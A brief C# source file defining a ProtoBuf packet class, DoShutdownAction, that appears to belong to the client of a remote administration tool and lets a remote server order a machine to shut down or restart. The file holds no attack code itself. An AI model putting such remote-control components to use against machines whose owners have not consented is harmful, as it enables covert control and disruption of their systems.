using ProtoBuf;
using xClient.Core.Networking;
using ShutdownAction = xClient.Core.Commands.CommandHandler.ShutdownAction;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoShutdownAction : IPacket
    {
        [ProtoMember(1)]
        public ShutdownAction Action { get; set; }

        public DoShutdownAction()
        {
        }

        public DoShutdownAction(ShutdownAction action)
        {
            this.Action = action;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}